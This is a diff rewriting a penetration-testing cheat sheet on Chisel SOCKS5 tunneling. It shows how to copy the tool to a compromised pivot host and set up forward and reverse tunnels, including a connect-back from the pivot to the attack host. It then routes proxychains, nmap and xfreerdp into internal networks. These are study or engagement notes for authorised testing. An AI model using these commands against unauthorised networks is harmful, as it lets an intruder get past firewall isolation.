@@ -1,77 +1,65 @@
+# SOCKS5 Tunneling with Chisel
 
-1. Determine if the compromised host allows inbound connections on arbitrary ports.
-2. If inbound is allowed: Deploy a Chisel server on the pivot host and connect from the attack host.
-3. If inbound is blocked (firewall restriction): Start a Chisel server with the reverse flag on the attack host and have the pivot host connect back.
-4. Update `/etc/proxychains.conf` to match the local listening port (default 1080).
-5. Execute internal tools through `proxychains`.
+Chisel = Go-based TCP/UDP tunnel over HTTP secured with SSH. Works where SSH direct tunneling is blocked — only needs HTTP/HTTPS outbound. Single binary, easy transfer.
 
 ---
 
-## Forward SOCKS5 Tunneling
+## Forward Mode (pivot listens, attack host connects)
 
-Internal network segments are unreachable from the attack host and the pivot host allows inbound traffic on the chosen listener port.
+Build and transfer the binary:
 
-Clone the repository to the attack host
-
-```
-git clone https://github.com/jpillora/chisel.git
-```
-
-Build the binary using the local Go environment
-
-```
-go build
+```bash
+git clone https://github.com/jpillora/chisel.git && cd chisel && go build
+scp chisel <USER>@<PIVOT_IP>:~/
 ```
 
-Transfer the binary to the pivot host via SCP
+Start server on pivot:
 
-```
-scp chisel <USERNAME>@<PIVOT_IP>:~/
-```
-
-Start the server on the pivot host listening for SOCKS5 connections
-
-```
-./chisel server -v -p <PORT> --socks5
+```bash
+./chisel server -v -p 1234 --socks5
 ```
 
-Connect the attack host client to the pivot server
+Connect from attack host — creates SOCKS5 listener on `127.0.0.1:1080`:
 
-```
-./chisel client -v <PIVOT_IP>:<PORT> socks
-```
-
-Add the tunnel to the proxy list in /etc/proxychains.conf
-
-```
-socks5 127.0.0.1 1080
+```bash
+./chisel client -v <PIVOT_IP>:1234 socks
 ```
 
-Run tools through the established SOCKS5 tunnel
+Update `/etc/proxychains.conf`:
 
 ```
-proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
+socks5  127.0.0.1 1080
 ```
 
-- **glibc version discrepancy** will trigger execution errors; compare library versions between systems or use prebuilt binaries.
-- **Large binary size** increases the risk of detection and impacts performance during transfer.
+---
 
-## Reverse SOCKS5 Tunneling
+## Reverse Mode (inbound blocked on pivot — attack host listens instead)
 
-Firewall rules restrict inbound connections to the compromised target host, requiring the pivot host to initiate the outbound connection.
+Use when firewall blocks inbound connections to the pivot but the pivot can initiate outbound to your attack host.
 
-Start the server on the attack host with reverse capabilities enabled
+Start server on attack host with `--reverse`:
 
-```
-sudo ./chisel server --reverse -v -p <PORT> --socks5
-```
-
-Connect from the pivot host back to the attack host using a reverse remote
-
-```
-./chisel client -v <ATTACK_IP>:<PORT> R:socks
+```bash
+sudo ./chisel server --reverse -v -p 1234 --socks5
 ```
 
-- **Reverse remote prefix** must be set to `R:socks` to ensure the server listens on its default SOCKS port (1080) and terminates at the client.
+Connect from pivot back to attack host with `R:socks`:
 
-> ⚠️ Gap: Chisel requires the specific Go build environment; if the target lacks specific dependencies or has an incompatible glibc version, the binary will fail to execute. Always have prebuilt versions for various architectures ready.
+```bash
+./chisel client -v <ATTACK_HOST_IP>:1234 R:socks
+```
+
+Same proxychains config: `socks5 127.0.0.1 1080`
+
+---
+
+Then use proxychains as normal:
+
+```bash
+proxychains xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>
+proxychains nmap -Pn -sT <TARGET_IP>
+```
+
+> [!tip] Chisel is the go-to when SSH `-D` isn't an option (no SSH on pivot, or port 22 is blocked). It only needs one outbound HTTP connection to work. Use prebuilt binaries from GitHub Releases if the Go build environment doesn't match the target's glibc version.
+
+> [!warning] Default SOCKS port is 1080 (not 9050). Update proxychains.conf accordingly — easy to forget when switching between SSH tunnels and Chisel.
